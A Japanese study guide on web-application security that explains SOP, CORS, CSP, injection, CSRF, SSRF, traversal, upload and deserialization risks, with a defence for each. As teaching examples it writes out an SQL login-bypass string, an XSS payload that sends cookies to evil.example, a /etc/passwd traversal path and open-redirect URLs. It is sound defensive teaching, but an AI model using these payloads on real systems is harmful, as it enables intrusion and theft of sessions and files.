1. 全体像：脆弱性はどこで生まれるか

入力 → 処理 → 出力 の3段階で考える

Webアプリは、利用者から何かを受け取り（入力）、それを使ってDB検索やメール送信などを行い（処理）、結果をHTMLなどで返します（出力）。多くの脆弱性は、外から来たデータが、どこかの段階で「意図しない使われ方」をすることで起きます。

大事な考え方：入力値の検証は「明らかにおかしい値を弾く」ための補助です。本命の対策は、処理や出力の場面で「データがデータのまま扱われる」ようにすること。この考え方はページ全体で何度も出てきます。

能動的攻撃と受動的攻撃

攻撃には2つの型があります。攻撃者がサーバーを直接狙う能動的攻撃と、正規の利用者に罠を踏ませて、その人のブラウザ経由で攻撃する受動的攻撃です。XSS や CSRF は後者で、ブラウザ側の防御（次の章）が重要になります。

2. ブラウザのセキュリティモデル

ブラウザには、悪いサイトを開いても被害が広がらないようにする仕組みが組み込まれています。アプリ側はこれを正しく使う・壊さないことが求められます。

同一オリジンポリシー（SOP）

オリジンとは「スキーム＋ホスト＋ポート」の組です。https://app.example:443 と https://evil.example は別オリジン。ブラウザは原則として、あるオリジンのJavaScriptが、別オリジンのデータを読むことを禁止しています。これがないと、罠サイトを開いただけで、ログイン中の銀行サイトの画面内容をJSで読まれてしまいます。

比べるURL（基準：https://app.example）同じオリジン？理由
https://app.example/users同じパスは関係ない
http://app.example違うスキームが違う
https://api.app.example違うホストが違う
https://app.example:8080違うポートが違う

CORS：別オリジンへの「読み取り許可」

フロントエンドとAPIが別オリジン、という構成は今では普通です。そこで、サーバーが「このオリジンからなら読んでいいよ」とレスポンスヘッダで宣言する仕組みが CORS（Cross-Origin Resource Sharing）です。

よくある勘違い：「CORSエラー」はサーバーが拒否したのではなく、ブラウザがレスポンスをJSに渡すのを止めた状態です。CORS はセキュリティを「緩める」仕組みなので、Access-Control-Allow-Origin: * や、届いた Origin をそのまま返すような設定は危険です。許可するオリジンは必要最小限に。

CSP とセキュリティヘッダ

レスポンスヘッダでブラウザに追加のルールを指示できます。アプリのバグを完全には防げませんが、被害を小さくする保険として効きます。

ヘッダ何をしてくれるか
Content-Security-Policy読み込んでよいスクリプトの出どころを制限。XSS が起きても外部スクリプトやインラインスクリプトを実行させにくくする
Strict-Transport-Security次回以降は必ず HTTPS で接続させる（HSTS）
X-Frame-Options / CSP の frame-ancestors他サイトの iframe に埋め込ませない（クリックジャッキング対策）
X-Content-Type-Options: nosniffブラウザが中身を推測してファイルの種類を変えるのを防ぐ
Referrer-Policyリンク先に送るURL情報を減らす

3. インジェクション

インジェクション（注入）は、データとして渡したつもりの文字列が、命令の一部として解釈されてしまう脆弱性の総称です。注入先が SQL なら SQLインジェクション、HTML なら XSS、シェルなら OSコマンドインジェクション…と名前が変わるだけで、原理は同じです。

SQLインジェクションで原理を見る

✗ 危険：文字列をつなげて SQL を作る

sql = "SELECT * FROM users WHERE name = '" + name + "' AND pass = '" + pass + "'"

ここでパスワード欄に ' OR '1'='1 と入力されると、組み立てられる SQL は次のようになります。

SELECT * FROM users WHERE name = 'admin' AND pass = '' OR '1'='1'

入力の中の ' が文字列を閉じてしまい、OR '1'='1'（常に真）がSQLの命令として追加されました。パスワードを知らなくてもログインできてしまいます。

✓ 安全：プレースホルダ（プリペアドステートメント）を使う

stmt = db.prepare("SELECT * FROM users WHERE name = ? AND pass = ?")
stmt.execute([name, pass])

SQL の「形」を先に確定させ、値は後から別枠で渡します。値に ' が入っていても、それはただの文字として扱われ、命令にはなりません。これが「命令とデータを分ける」の具体例です。

XSS（クロスサイト・スクリプティング）

利用者の入力をエスケープせずに HTML に埋め込むと、そこに <script> を仕込まれて、他の利用者のブラウザで攻撃者のJavaScriptが動きます。Cookie の盗難、画面の書き換え、本人になりすました操作などが可能になります。

✗ 危険

<p>こんにちは、<?= $_GET['name'] ?> さん</p>
// name=<script>fetch('https://evil.example/?c='+document.cookie)</script>

✓ 安全：出力時に HTML エスケープする

<p>こんにちは、<?= htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8') ?> さん</p>

< → &lt; のように、HTML で特別な意味を持つ文字を「ただの文字」に変換します。React や多くのテンプレートエンジンは標準でエスケープしてくれますが、dangerouslySetInnerHTML や innerHTML のように自分でHTMLを差し込む箇所は要注意です。

  • 反射型：URLのパラメータに仕込んだスクリプトが、その場でページに返ってくる（罠リンクを踏ませる）
  • 持続型：掲示板などに保存され、見た人全員のブラウザで動く（被害が広がりやすい）
  • DOM Based：サーバーを通らず、フロントのJSが location などを innerHTML に入れて起きる（6章）

注意点として、href="..." に javascript: から始まるURLを入れられるケースは HTML エスケープでは防げません。URLを出力するときは http: / https: で始まるかもチェックします。保険として Cookie に HttpOnly を付け、JS から読めないようにしておきます。

インジェクションの仲間たち

名前注入される先何が起きるか基本の対策
SQLインジェクションデータベース情報漏洩・改ざん・認証回避プレースホルダ
XSSHTML / JS他人のブラウザでスクリプト実行出力先に合わせたエスケープ
OSコマンドインジェクションシェル; rm -rf などでサーバー乗っ取りシェルを経由しない（ライブラリやシェルを使わない関数で呼ぶ）
メールヘッダインジェクションメールのヘッダ改行を入れて Bcc: を追加 → 迷惑メールの踏み台改行を拒否・メール送信ライブラリを使う
HTTPヘッダインジェクションレスポンスヘッダ改行を入れて偽の Cookie やヘッダを追加リダイレクト等は専用APIに任せ、改行をチェック
ファイルインクルードinclude するファイル名サーバー内のファイル閲覧・任意コード実行外部からファイル名を指定させない
プロンプトインジェクションLLM への指示文書やWebページに仕込んだ指示でAIが乗っ取られるAIに渡す権限を絞る（完全な遮断は難しい）

どれも「改行・引用符・記号など、注入先の文法で意味を持つ文字」が鍵になります。だから対策は「文法ごと切り離す」（プレースホルダ・専用API）か、「意味を消す」（エスケープ）のどちらかが基本です。

4. リクエスト偽造・リダイレクト

CSRF（クロスサイト・リクエストフォージェリ）

ログイン中の利用者に罠ページを開かせ、本人が意図していないリクエスト（送金、パスワード変更、投稿など）を送らせる攻撃です。ブラウザは送り先のサイトの Cookie を自動で付けるので、サーバーからは本人の操作と区別できません。

  1. 利用者が罠ページを開くと、銀行サイトあての送金フォームが自動で送信される
  2. ブラウザは bank.example の Cookie を自動で付けて送る
  3. 銀行サイトは「ログイン中の本人からの送金」と判断して実行してしまう

対策：正規の画面にだけ埋め込んだ推測できない値（CSRFトークン）をフォームと一緒に送らせ、サーバーで照合します。罠サイトはこの値を知りえません。重要な操作ではパスワード再入力も有効です。Cookie の SameSite=Lax（現在の多くのブラウザの既定）も、他サイトからの POST に Cookie を付けなくする保険になります。また、GET で状態を変更しないのが前提です。

XSSCSRF
攻撃者ができることブラウザ上で好きなJSを動かす（何でもできる）決められたリクエストを送らせるだけ
悪いのはどこ出力のエスケープ漏れリクエストの正当性を確認していない

オープンリダイレクト

/login?next=https://evil.example のように、リダイレクト先を URL パラメータでそのまま受け取ると、正規ドメインのリンクから偽サイトへ飛ばせてしまいます。フィッシングに使われます。

対策：リダイレクト先を固定する、番号で指定させる（?next=2 → サーバー側の一覧から選ぶ）、またはドメインを許可リストで照合します。//evil.example や https://app.example.evil.example のような抜け道に注意し、文字列の部分一致ではなく URL をパースしてホストを比べます。

SSRF（サーバーサイド・リクエストフォージェリ）

「URLを渡すとサーバーが取りに行く」機能（画像のURL取り込み、Webhook、リンクのプレビューなど）を悪用し、外からは届かない内部のサーバーへ、Webサーバー自身にアクセスさせる攻撃です。

  1. 攻撃者が「このURLの画像を取り込んで」と内部のアドレスを指定する
  2. Webサーバーは内部ネットワークの中にいるので、そのアドレスに届いてしまい、結果を攻撃者に返す

対策：そもそも任意のURLを受け付けない（許可したドメインだけ）。どうしても必要なら、名前解決した後の接続先IPがプライベートアドレスでないかを検査し、リダイレクト先も同様にチェックします。ネットワーク側でも、Webサーバーから内部への通信を絞っておきます。

5. ファイル・データ処理

ディレクトリ・トラバーサル

ファイル名を外から受け取って開く処理で、../ を使って想定外のディレクトリのファイルを読まれる脆弱性です。

// 想定：/var/www/files/ + "report.pdf"
// 攻撃：/var/www/files/ + "../../../etc/passwd"  → サーバーの重要ファイルを読まれる

対策：外からファイル名を指定させない（ID で指定させて、サーバー側でファイル名に変換する）のが一番。どうしても必要なら、basename() などでディレクトリ部分を取り除き、英数字だけに限定します。また、公開ディレクトリに見られて困るファイル（設定ファイル・バックアップなど）を置かないことも大切です。

ファイルアップロード

危険例対策
サーバー側でスクリプトが実行されるshell.php をアップロードして URL を開く公開ディレクトリに置かない／拡張子を許可リストで制限／保存ディレクトリでスクリプトを実行させない
ダウンロード時の XSS画像と偽った HTML をブラウザが HTML として表示正しい Content-Type、nosniff、必要なら Content-Disposition: attachment
DoS巨大ファイルを大量に送るサイズ・件数の上限を設ける

構造化データの読み込み（eval・デシリアライズ・XXE）

外から来たデータを「プログラムやオブジェクトとして」読み込む処理は、インジェクションと同じく任意コード実行につながりやすい危険地帯です。

  • eval インジェクション：文字列をコードとして実行する eval に外部の値を渡してしまう → eval を使わない
  • 安全でないデシリアライズ：Cookie などから受け取ったデータを言語固有のシリアライズ形式（PHP の unserialize、Python の pickle など）で復元すると、復元の途中でコードが動くことがある → JSON で受け渡す、または改ざん検知（HMAC）を付ける
  • XXE（XML外部実体参照）：XML の機能で「外部ファイルの中身を読み込め」と書かれ、サーバー内のファイルを読まれる → JSON を使う、XML パーサの外部実体を無効にする

6. API・JavaScript

キャッシュと競合状態

  • キャッシュからの情報漏洩：CDN やプロキシが「Aさんのマイページ」をキャッシュし、Bさんに返してしまう → 個人情報を含むページは Cache-Control: private, no-store などを付ける。CDN 側の設定も確認する
  • 競合状態（レースコンディション）：同時アクセスで共有の変数やDBの値が混ざり、他人の情報が表示されたり、クーポンが二重に使えたりする → 共有資源を避ける、ロックやトランザクションで排他制御する

Web API

  • JSON の作り方：文字列連結で JSON を作らず、JSON.stringify などのライブラリを使う。レスポンスには Content-Type: application/json を必ず付ける
  • API の CSRF：Cookie 認証の API も CSRF の対象。カスタムヘッダの必須化やトークン、CORS 設定と合わせて防ぐ
  • CORS の設定ミス：届いた Origin をそのまま許可して返す設定は、どのサイトからでも読めるのと同じ
  • 大量取得・権限チェック漏れ：ID を連番で変えるだけで他人のデータが取れる、件数制限がない、など。認可チェックとレート制限はサーバー側で

フロントエンドの JavaScript

  • DOM Based XSS：location.hash などの値を innerHTML・eval・document.write に渡すと起きる → textContent を使う、javascript: URL を拒否する
  • Web ストレージ：localStorage は同じオリジンのJSなら誰でも読める。XSS が1つでもあれば中身を抜かれるので、トークンなど重要な情報の置き場には慎重に
  • postMessage：受け取る側は event.origin を必ず確認し、送る側は宛先オリジンを * にしない
  • ライブラリを最新に保つ：自分のコードが正しくても、依存ライブラリの脆弱性から入られることがある

7. 何をいつ対策するか

全部を毎回考えるのは大変なので、「どのアプリでも必ずやること」と「その機能を作るときに考えること」に分けると漏れにくくなります。

A. ほぼすべてのアプリで必須

  • 出力のエスケープ（XSS）
  • プレースホルダ（SQLインジェクション）
  • CSRF 対策
  • セッション管理・Cookie 属性
  • HTTPS
  • 入力値の検証（補助として）
  • 詳細なエラーを外に出さない
  • 認証・認可（アカウントがあるなら）

B. その機能を作るときに考える

  • リダイレクト → オープンリダイレクト
  • メール送信 → ヘッダインジェクション
  • ファイル読み書き → トラバーサル
  • 外部コマンド → OSコマンドインジェクション
  • アップロード → スクリプト実行・XSS
  • XML・シリアライズ → XXE・デシリアライズ
  • URL取り込み → SSRF
  • CDN・キャッシュ → 情報漏洩
  • 別オリジンのAPI → CORS 設定

多層防御：1つの対策が破られても次で止まるように重ねます。たとえば XSS なら「エスケープ（本命）」＋「CSP」＋「Cookie の HttpOnly」。SQL なら「プレースホルダ（本命）」＋「DB ユーザーの権限を最小に」＋「詳細エラーを出さない」。本命を省いて保険だけに頼るのはNGです。

8. 学習の進め方

  1. 前提を固める：HTTP・オリジン・CORS（ノートの 10_ブラウザのセキュリティモデル）
  2. 必須の脆弱性を押さえる：XSS・SQLインジェクション・CSRF（20・30）と、セッション・Cookie（74）
  3. 守りの機能を学ぶ：認証・認可・アカウント管理（73）、ログ（71）
  4. 機能別を必要に応じて読む：自分が作る機能に合わせて 40・50 や残りの章を
  5. インフラ・運用へ広げる：多層防御、依存ライブラリの更新、秘密情報の管理、監視

このページで扱っていない 認証・認可（73_）と セッション・Cookie（74_）も、全アプリ必須の重要分野です。
